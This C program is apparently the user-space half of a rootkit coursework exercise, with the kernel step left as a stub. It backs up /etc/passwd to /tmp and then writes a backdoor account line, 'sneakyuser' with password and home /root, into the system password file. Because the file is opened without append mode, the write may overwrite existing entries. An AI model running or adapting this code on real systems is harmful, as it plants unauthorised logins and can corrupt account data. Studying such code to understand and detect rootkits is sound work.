#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/string.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <fcntl.h>

	
void fileProc(void){
	// 1. Copy /etc/passwd to /tmp/passwd
	char * fname = "/etc/passwd";
	char * pwd = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
	char * cmd1[] = {"cp", fname,"/tmp/passwd", 0};
	char * cmd2[] = {"echo", pwd, 0}; 
	//void copy_to_temp(from,to);
	pid_t cpid, wid;
	int status;
	cpid = fork();
	if(cpid == 0){
		//process to copy files
		printf("copying passwd file to user space\n");
		execvp(cmd1[0],cmd1);
	}else{
		//wait pid...
		do{
			wid = waitpid(cpid, &status, WUNTRACED | WCONTINUED);
			if(wid == -1){
				perror("waitpid");
				exit(EXIT_FAILURE);
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
		printf("Done waiting...\n");
		//process to write to user
		int fd = open(fname, O_WRONLY, S_IRUSR | S_IWUSR);
		dup2(fd,1);
		execvp(cmd2[0],cmd2);
		close(fd);
	}
}

void kernelProc(void){
	printf("Execute kernel process here\n");
}

int main(int argc, char *argv[]){
	pid_t fpid, kpid;
	int status;
	fpid = fork();
	if(fpid == 0){
		printf("executing file process...\n");
		fileProc();
	}else{
		//wait pid...
		do{
			kpid = waitpid(fpid, &status, WUNTRACED | WCONTINUED);
			if(kpid == -1){
				perror("waitpid");
				exit(EXIT_FAILURE);
			}
		} while(!WIFEXITED(status) && !WIFSIGNALED(status));
		kernelProc();
	}

}
